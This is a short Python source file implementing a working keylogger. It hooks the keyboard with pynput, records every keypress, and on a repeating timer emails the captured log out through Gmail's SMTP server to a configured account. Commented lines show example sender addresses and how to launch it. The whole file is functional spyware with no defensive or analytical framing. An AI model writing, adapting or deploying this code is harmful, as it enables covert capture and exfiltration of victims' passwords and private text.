# pip install pynput

import pynput.keyboard
import threading
import smtplib

# log = ""
#
# result = ""
# sendmail("workfencesender@gmail.com", "password", result)

class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password


    def append_to_log(self, string):
        self.log+=string
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " "+str(key) +" "
        #print(log)
        self.append_to_log(current_key)

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):

        #print(self.log)
        self.send_mail(self.email, self.password, "\n\n"+ self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

#import keylogger
# my_key = keylogger.Keylogger(120, "vivek@gmail.com", "absd")
# my_key.start()